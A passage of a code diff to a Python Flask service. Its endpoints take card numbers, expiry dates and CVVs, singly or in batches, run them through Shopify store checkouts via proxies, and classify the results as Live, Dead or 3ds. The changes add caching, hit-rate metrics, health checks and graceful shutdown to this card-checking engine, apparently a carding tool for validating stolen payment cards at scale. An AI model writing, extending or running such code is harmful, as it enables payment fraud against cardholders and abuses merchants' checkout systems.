-                            return cs, success, msg, gw, price, cur
+                            s, m, g, pr, c = await _throttled_process(p['cc'], p['mes'], p['ano'], p['cvv'], site, variant_id, prx, timeout_sec, uid=uid)
+                            return cs, s, m, g, pr, c
                         except Exception as ex:
                             return cs, False, str(ex), "UNKNOWN", "0.00", "USD"
                     tasks.append(_check())
-
             return await asyncio.gather(*tasks)
 
-        future_timeout = max(300, (len(cards) * 3) + timeout_sec + 60)
         future = asyncio.run_coroutine_threadsafe(_run_batch(), loop)
-        results = future.result(timeout=future_timeout)
-
-        output = []
-        for cc_string, success, message, gateway, price, currency in results:
-            output.append(_build_result(cc_string, success, message, gateway, price, currency, site))
-
+        results = future.result(timeout=max(300, (len(cards) * 3) + timeout_sec + 60))
+        output = [_build_result(cs, s, m, g, pr, c, site) for cs, s, m, g, pr, c in results]
         return jsonify(output)
-
     except Exception as e:
         logger.error(f"Error in batch_checker: {e}")
         return jsonify({"error": str(e), "status": False}), 500
 
-# ── Site-only check endpoint ──────────────────────────────────────────
+
 @app.route('/site_check', methods=['GET'])
 def site_check():
     try:
         site = request.args.get('site') or request.args.get('url')
         proxy_str = request.args.get('proxy')
-        timeout_val = request.args.get('timeout')
-        timeout_sec = _parse_timeout_value(timeout_val, 20)
-
+        timeout_sec = _parse_timeout_value(request.args.get('timeout'), 20)
         if not site:
             return jsonify({"valid": False, "error": "Missing 'site' parameter"}), 400
-
-        ourl = site if site.startswith('http') else f'https://{site}'
-
+        proxy = parse_proxy(proxy_str) if proxy_str else None
+        if proxy_str and not proxy:
+            return jsonify({"valid": False, "error": "Invalid proxy format"}), 400
+        ourl = (site if site.startswith('http') else f'https://{site}').rstrip('/')
+        cache_key = normalize_cache_key(ourl)
+        with _VARIANT_CACHE_LOCK:
+            cached = _VARIANT_CACHE.get(cache_key)
+        if cached:
+            ttl = cached[5] if len(cached) > 5 else 7200
+            if time.time() - cached[1] < ttl:
+                return jsonify({"valid": True, "site": site, "variant_id": cached[0], "price": f"{cached[4]:.2f}", "usd_price": cached[4], "currency": cached[3], "requires_shipping": cached[2], "cached": True})
         loop = get_event_loop()
-        future = asyncio.run_coroutine_threadsafe(
-            fetch_products(ourl, proxy_str, timeout_sec),
-            loop
-        )
-        result = future.result(timeout=timeout_sec + 10)
-
+        future = asyncio.run_coroutine_threadsafe(fetch_products(ourl, proxy_str, timeout_sec), loop)
+        result = future.result(timeout=timeout_sec * 4 + 60)
         if isinstance(result, tuple) and result[0] is False:
-            return jsonify({
-                "valid": False,
-                "site": site,
-                "error": str(result[1])
-            })
-
-        return jsonify({
-            "valid": True,
-            "site": site,
-            "variant_id": result.get('variant_id'),
-            "price": result.get('price'),
-            "link": result.get('link'),
-            "currency": result.get('currency', 'USD'),
-            "requires_shipping": result.get('requires_shipping', False)
-        })
-
+            return jsonify({"valid": False, "site": site, "error": str(result[1])})
+        return jsonify({"valid": True, "site": site, "variant_id": result.get('variant_id'), "price": result.get('price'), "usd_price": result.get('usd_price'), "link": result.get('link'), "currency": result.get('currency', 'USD'), "requires_shipping": result.get('requires_shipping', False)})
     except Exception as e:
         logger.error(f"Error in site_check: {e}")
         return jsonify({"valid": False, "site": request.args.get('site', ''), "error": str(e)}), 500
 
-# ── Clear Cache endpoint ──────────────────────────────────────────────
+
+@app.route('/metrics', methods=['GET'])
+def metrics_endpoint():
+    with _METRICS_LOCK:
+        snapshot = dict(_METRICS)
+    with _SESSION_POOL_STATE_LOCK:
+        pool_total = sum(len(v) for v in _SESSION_POOL.values())
+    snapshot["active_workers"] = ACTIVE_WORKERS
+    snapshot["variant_cache_size"] = len(_VARIANT_CACHE)
+    snapshot["session_pool_idle"] = pool_total
+    total = snapshot.get("total_requests", 0)
+    if total > 0:
+        for k in ("Live", "Dead", "3ds", "SITE_ERROR", "PROXY_ERROR", "AMBIGUOUS"):
+            snapshot[f"{k}_pct"] = round(snapshot.get(k, 0) * 100.0 / total, 2)
+    return jsonify(snapshot)
+
+
+@app.route('/health', methods=['GET'])
+def health_endpoint():
+    checks = {"process_alive": True, "loop_alive": False, "connector_alive": False}
+    try:
+        checks["loop_alive"] = _loop is not None and not _loop.is_closed() and _loop_thread is not None and _loop_thread.is_alive()
+    except Exception:
+        pass
+    try:
+        checks["connector_alive"] = _global_connector is not None and not _global_connector.closed
+    except Exception:
+        pass
+    all_ok = all(checks.values())
+    return jsonify({"healthy": all_ok, "checks": checks}), (200 if all_ok else 503)
+
+
 @app.route('/delcache', methods=['GET'])
 def clear_cache():
     global _VARIANT_CACHE
-    cleared = len(_VARIANT_CACHE)
-    _VARIANT_CACHE.clear()
-    logger.info(f"Cache cleared: {cleared} items removed")
+    with _VARIANT_CACHE_LOCK:
+        cleared = len(_VARIANT_CACHE)
+        _VARIANT_CACHE.clear()
     return jsonify({"status": "success", "cleared": cleared})
 
-# ── Status endpoint ──────────────────────────────────────────────────
+
 @app.route('/status', methods=['GET'])
 def status():
-    cached_count = len(_VARIANT_CACHE)
+    with _VARIANT_CACHE_LOCK:
+        cached_count = len(_VARIANT_CACHE)
     with _SESSION_POOL_STATE_LOCK:
         pool_stats = {k: len(v) for k, v in _SESSION_POOL.items()}
-    pool_total = sum(pool_stats.values())
-
     sys_stats = {}
     try:
         import psutil, time as _time
@@ -1462,7 +2356,6 @@ def status():
         ram = psutil.virtual_memory()
         sys_stats["ram_percent"] = ram.percent
         sys_stats["ram_used_gb"] = round(ram.used / (1024**3), 1)
-        sys_stats["ram_total_gb"] = round(ram.total / (1024**3), 1)
         uptime_seconds = _time.time() - psutil.boot_time()
         days, rem = divmod(uptime_seconds, 86400)
         hours, rem = divmod(rem, 3600)
@@ -1470,31 +2363,32 @@ def status():
         sys_stats["uptime_str"] = f"{int(days)}d {int(hours)}h {int(minutes)}m"
     except Exception as e:
         sys_stats["error"] = str(e)
+    return jsonify({"status": "online", "max_concurrent": MAX_CONCURRENT, "active_workers": ACTIVE_WORKERS, "max_per_site": _get_max_per_site(), "variant_cache_size": cached_count, "session_pool": pool_stats, "system_specs": sys_stats})
 
-    return jsonify({
-        "status": "online",
-        "max_concurrent": MAX_CONCURRENT,
-        "active_workers": ACTIVE_WORKERS,
-        "max_per_site": _get_max_per_site(),
-        "variant_cache_size": cached_count,
-        "session_pool": pool_stats,
-        "session_pool_total_idle": pool_total,
-        "system_specs": sys_stats,
-        "endpoints": {
-            "single":     "GET /shopify?site=...&cc=...&proxy=...",
-            "batch":      "POST /batch {site, cards[], proxy}",
-            "site_check": "GET /site_check?site=...&proxy=... (pre-warm cache, no CC)",
-            "status":     "GET /status"
-        }
-    })
 
 atexit.register(stop_background_loop)
+
 
 if __name__ == "__main__":
     logger.info(f"[ENGINE] Max concurrency: {MAX_CONCURRENT} cards")
     logger.info("[ENGINE] Single:     GET /shopify?site=...&cc=...&proxy=...")
     logger.info("[ENGINE] Batch:      POST /batch  {site, cards[], proxy}")
-    logger.info("[ENGINE] Site-check: GET /site_check?site=...&proxy=... (pre-warm variant cache)")
+    logger.info("[ENGINE] Site-check: GET /site_check?site=...&proxy=...")
+
+    try:
+        def _handle_sigterm(signum, frame):
+            logger.info("SIGTERM received, shutting down...")
+            stop_background_loop()
+            raise SystemExit(0)
+        signal.signal(signal.SIGTERM, _handle_sigterm)
+    except Exception:
+        pass
+
     get_event_loop()
+    try:
+        asyncio.run_coroutine_threadsafe(_prewarm_session_pool(), get_event_loop())
+    except Exception:
+        pass
+
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
